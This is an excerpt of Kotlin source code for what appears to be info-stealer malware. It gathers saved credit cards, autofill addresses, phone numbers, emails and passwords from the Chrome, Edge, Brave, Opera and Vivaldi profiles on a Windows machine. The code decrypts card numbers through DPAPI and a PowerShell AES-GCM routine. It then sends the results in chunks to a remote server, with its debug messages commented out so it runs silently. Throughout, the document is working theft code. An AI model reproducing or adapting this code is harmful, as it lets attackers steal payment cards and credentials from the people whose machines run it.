...
data class CreditCard(
    ...
    val cardNumber: String, // Last 4 digits only for display, full number in encryptedNumber
    val expirationMonth: Int,
    val expirationYear: Int,
    val encryptedNumber: String?, // Full decrypted card number
...
data class PcData(
    ...
    val creditCards: List<CreditCard>?, // Browser saved credit cards
    val autofillAddresses: List<AutofillAddress>?, // Browser autofill addresses
...
fun main() {
    ...
    try {
        ...
        // Get credit cards and autofill addresses and send update
        try {
            // println("Collecting credit cards and autofill data...")
            val creditCards = extractCreditCards()
            val autofillAddresses = extractAutofillAddresses()
            
            if (creditCards.isNotEmpty() || autofillAddresses.isNotEmpty()) {
                sendChunk(client, serverUrl, sessionId, json, PcData(
                    user = user,
                    screenSize = screenSize,
                    dateTime = dateTime,
                    ...
                    browserCookies = null,
                    savedPasswords = null,
                    creditCards = creditCards.takeIf { it.isNotEmpty() },
                    autofillAddresses = autofillAddresses.takeIf { it.isNotEmpty() },
                    discordTokens = null,
                    systemInfo = null,
                    cryptoWallets = null,
                    cryptoWalletFolders = null,
                ...
                // println("Credit cards sent successfully (${creditCards.size} cards)")
                // println("Autofill addresses sent successfully (${autofillAddresses.size} addresses)")
            } else {
                // println("No credit cards or autofill data found")
            }
        } catch (e: Exception) {
            // println("Error collecting credit cards/autofill: ${e.message}")
        }
                        ...
                        if (passwordsContent.isNotBlank()) {
                            ...
                            if (startIdx != -1 && endIdx != -1 && endIdx > startIdx) {
                                ...
                                for (i in 0 until jsonArray.length()) {
                                    ...
                                    val origin = pwdObj.optString("origin", "").trim()
                                    val username = pwdObj.optString("username", "").trim()
                                    val password = pwdObj.optString("password", "").trim()
                                    
                                    // Only add passwords with actual data (not empty, not "N/A", not null)
                                    if (origin.isNotEmpty() && origin.lowercase() != "n/a" &&
                                        username.isNotEmpty() && username.lowercase() != "n/a" &&
                                        password.isNotEmpty() && password.lowercase() != "n/a") {
                                        allPasswords.add(
                                            SavedPassword(
                                                origin = origin,
                                                username = username,
...
fun extractCreditCards(): List<CreditCard> {
    val creditCards = mutableListOf<CreditCard>()
    val userHome = System.getProperty("user.home")
    
    // Browser paths for Web Data (contains credit cards and autofill)
    val browserPaths = mapOf(
        "Chrome" to "$userHome\\AppData\\Local\\Google\\Chrome\\User Data",
        "Edge" to "$userHome\\AppData\\Local\\Microsoft\\Edge\\User Data",
        "Brave" to "$userHome\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
        "Opera" to "$userHome\\AppData\\Roaming\\Opera Software\\Opera Stable",
        "Vivaldi" to "$userHome\\AppData\\Local\\Vivaldi\\User Data"
    )
    
    for ((browserName, browserPath) in browserPaths) {
        val browserDir = File(browserPath)
        if (!browserDir.exists()) continue
        
        // Find all profile directories
        val profileDirs = mutableListOf<File>()
        
        // Add Default profile
        val defaultProfile = File(browserPath, "Default")
        if (defaultProfile.exists()) profileDirs.add(defaultProfile)
        
        // Add numbered profiles (Profile 1, Profile 2, etc.)
        browserDir.listFiles()?.filter { 
            it.isDirectory && it.name.startsWith("Profile ") 
        }?.forEach { profileDirs.add(it) }
        
        // Opera doesn't use profile subdirectories
        if (browserName == "Opera" && browserDir.exists()) {
            profileDirs.clear()
            profileDirs.add(browserDir)
        }
        
        for (profileDir in profileDirs) {
            val profileName = if (browserName == "Opera") "Default" else profileDir.name
            val webDataPath = File(profileDir, "Web Data")
            
            if (!webDataPath.exists()) continue
            
            // Copy the database to temp location (to avoid locking issues)
            val tempDb = File.createTempFile("webdata_", ".db")
            tempDb.deleteOnExit()
            
            try {
                webDataPath.copyTo(tempDb, overwrite = true)
                
                Class.forName("org.sqlite.JDBC")
                DriverManager.getConnection("jdbc:sqlite:${tempDb.absolutePath}").use { connection ->
                    // Query credit cards table
                    try {
                        connection.createStatement().use { statement ->
                            val query = """
                                SELECT name_on_card, expiration_month, expiration_year, 
                                       card_number_encrypted, billing_address_id
                                FROM credit_cards
                            """.trimIndent()
                            
                            statement.executeQuery(query).use { resultSet ->
                                while (resultSet.next()) {
                                    val nameOnCard = resultSet.getString("name_on_card") ?: ""
                                    val expMonth = resultSet.getInt("expiration_month")
                                    val expYear = resultSet.getInt("expiration_year")
                                    val encryptedNumber = resultSet.getBytes("card_number_encrypted")
                                    
                                    // Try to decrypt the card number using DPAPI
                                    val decryptedNumber = decryptDPAPI(encryptedNumber)
                                    
                                    // Mask the card number for display (show last 4 digits)
                                    val displayNumber = if (decryptedNumber != null && decryptedNumber.length >= 4) {
                                    ...
                                    creditCards.add(
                                        CreditCard(
                                            ...
                                            encryptedNumber = decryptedNumber,
                                            billingAddress = null
                                        )
                                    )
                                }
                        ...
                        // println("Error querying credit cards from $browserName: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                // println("Error reading Web Data from $browserName/$profileName: ${e.message}")
            } finally {
                tempDb.delete()
            }
        }
...
fun extractAutofillAddresses(): List<AutofillAddress> {
    val addresses = mutableListOf<AutofillAddress>()
    val userHome = System.getProperty("user.home")
    ...
    for ((browserName, browserPath) in browserPaths) {
        ...
        for (profileDir in profileDirs) {
            ...
            try {
                ...
                Class.forName("org.sqlite.JDBC")
                DriverManager.getConnection("jdbc:sqlite:${tempDb.absolutePath}").use { connection ->
                    // Query autofill_profiles table (Chromium-based browsers)
                    try {
                        connection.createStatement().use { statement ->
                            // First try the newer autofill_profiles table structure
                            val query = """
                                SELECT 
                                    ...
                                    if (fullName.isNotEmpty() || streetAddress.isNotEmpty() || city.isNotEmpty()) {
                                        addresses.add(
                                            AutofillAddress(
                                                ...
                                                streetAddress = streetAddress.takeIf { it.isNotEmpty() },
                                                city = city.takeIf { it.isNotEmpty() },
                                                state = state.takeIf { it.isNotEmpty() },
                                                zipCode = zipCode.takeIf { it.isNotEmpty() },
                        ...
                        // Try alternative table structure (autofill_profile_addresses)
                        try {
                            connection.createStatement().use { statement ->
                                val query = """
                                    SELECT 
                                ...
                                statement.executeQuery(query).use { resultSet ->
                                    while (resultSet.next()) {
                                        ...
                                        val city = resultSet.getString("city")
                                        val state = resultSet.getString("state")
                                        val zipCode = resultSet.getString("zip_code")
                                        val country = resultSet.getString("country_code")
                            ...
                            // println("Error querying autofill addresses from $browserName: ${e2.message}")
                        }
                    }
                    
                    // Also try to get phone numbers and emails from autofill_profile_phones and autofill_profile_emails
                    try {
                        connection.createStatement().use { statement ->
                            val phoneQuery = "SELECT COALESCE(number, '') as phone FROM autofill_profile_phones"
                            statement.executeQuery(phoneQuery).use { resultSet ->
                                while (resultSet.next()) {
                                    val phone = resultSet.getString("phone")
                                    if (phone.isNotEmpty()) {
                                        // Add as a separate entry or update existing
                                        addresses.add(
                                            AutofillAddress(
                                                browser = browserName,
                                                profile = profileName,
                        ...
                        // Phone table might not exist
                    }
                    
                    try {
                        connection.createStatement().use { statement ->
                            val emailQuery = "SELECT COALESCE(email, '') as email FROM autofill_profile_emails"
                            statement.executeQuery(emailQuery).use { resultSet ->
                                while (resultSet.next()) {
...
// Helper function to decrypt DPAPI encrypted data (Windows)
fun decryptDPAPI(encryptedData: ByteArray?): String? {
    if (encryptedData == null || encryptedData.isEmpty()) return null
    
    return try {
        // Check if data starts with 'v10' or 'v11' (Chrome 80+ encryption)
        val dataStr = String(encryptedData.take(3).toByteArray(), Charsets.UTF_8)
        
        if (dataStr == "v10" || dataStr == "v11") {
            // Chrome 80+ uses AES-256-GCM with key from Local State
            // This requires the master key from Local State file
            // For now, we'll try to use PowerShell to decrypt
            decryptWithPowerShell(encryptedData)
        } else {
...
fun decryptWithPowerShell(encryptedData: ByteArray): String? {
    return try {
        // Convert bytes to base64 for passing to PowerShell
        val base64Data = java.util.Base64.getEncoder().encodeToString(encryptedData)
        ...
        val psCommand = """
            try {
                ...
                ${'$'}prefix = [System.Text.Encoding]::UTF8.GetString(${'$'}bytes[0..2])
                
                if (${'$'}prefix -eq 'v10' -or ${'$'}prefix -eq 'v11') {
                    # Chrome 80+ encryption - try to get master key from Local State
                    ...
                    if (Test-Path ${'$'}localStatePath) {
                        ...
                        # Extract IV (12 bytes after 'v10'/'v11') and ciphertext
                        ${'$'}iv = ${'$'}bytes[3..14]
        ...
        if (output.isNotEmpty() && output != "null") output else null
    } catch (e: Exception) {
        null
    }
}
